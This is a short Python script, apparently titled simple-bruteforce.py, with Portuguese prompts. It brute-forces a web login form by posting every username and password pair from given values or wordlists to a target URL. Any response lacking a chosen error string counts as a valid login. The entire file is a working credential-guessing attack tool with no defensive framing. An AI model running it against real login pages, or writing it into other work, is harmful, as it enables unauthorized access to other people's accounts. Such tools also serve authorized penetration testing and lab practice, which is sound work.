import sys
import requests

if(len(sys.argv) != 7):
    print("[!] Rode o comando simple-bruteforce.py com 6 argumentos. Para saber mais digite: 'python simple-bruteforce.py -h'")
    sys.exit("[!] Exemplo: simple-bruteforce.py HOST Chave_Usuario UserWordlist Chave_Senha PasswordWordlist ErrorMessage ")

host = sys.argv[1]
key_user = sys.argv[2]
user = sys.argv[3]
key_password = sys.argv[4]
password = sys.argv[5]
error_message = sys.argv[6]

def WordOrUser(variable):
    if ('.txt' in variable):
        return True
    
    return False

def CheckFiles():
    arquivo_user = 1

    if(WordOrUser(user)):
        arquivo_user = True
    else:
        arquivo_user = False

    if(WordOrUser(password)):
        arquivo_password = True
    else:
        arquivo_password = False

    retorno = [arquivo_user,arquivo_password]
    return retorno

def Init():
    retorno = CheckFiles()

    if(retorno[0]==True and retorno[1]==True):
        ReadFiles(user,password)
    elif(retorno[0]==False and retorno[1]==False):
        retorno = Force(user,password)
        if(retorno == True):
            print("==============================================")
            print("[!] Usuário: "+user+" | Senha: "+password)
            print("[!] Você achou o usuário e senha correto.")
            sys.exit("==============================================")
    elif(retorno[0]==False and retorno[1]==True):
        ReadPasswordFile(user,password)
    elif(retorno[0]==True and retorno[1]==False):
        ReadUserFile(user,password)

def ReadFiles(user,password):
    userlist = open(user, 'r').read().split('\n')
    passwordlist = open(password, 'r').read().split('\n')
    for user_teste in userlist:
        for pass_teste in passwordlist:

            print("[*] Testando: "+user_teste+" | "+pass_teste)
            
            retorno=Force(user_teste,pass_teste)

            if(retorno==True):
                print("==============================================")
                print("[!] Usuário: "+user_teste+" | Senha: "+pass_teste)
                print("[!] Você achou o usuário e senha correto.")
                sys.exit("==============================================")

def ReadPasswordFile(user,password):
    passwordlist = open(password, 'r').read().split('\n')

    for pass_teste in passwordlist:

            print("[*] Testando: "+user+" | "+pass_teste)
            
            retorno=Force(user,pass_teste)

            if(retorno==True):
                print("==============================================")
                print("[!] Usuário: "+user+" | Senha: "+pass_teste)
                print("[!] Você achou o usuário e senha correto.")
                sys.exit("==============================================")

def ReadUserFile(user,password):
    userlist = open(user, 'r').read().split('\n')

    for user_teste in userlist:
        print("[*] Testando: "+user_teste+" | "+password)
            
        retorno=Force(user_teste,password)

        if(retorno==True):
            print("==============================================")
            print("[!] Usuário: "+user_teste+" | Senha: "+password)
            print("[!] Você achou o usuário e senha correto.")
            sys.exit("==============================================")

def Force(usuario,senha):
    objeto = {key_user : str(usuario), key_password: str(senha)}

    x = requests.post(host, data = objeto)
    
    if(x.text.find(error_message) != -1):
        return False
    else:
        return True

Init()








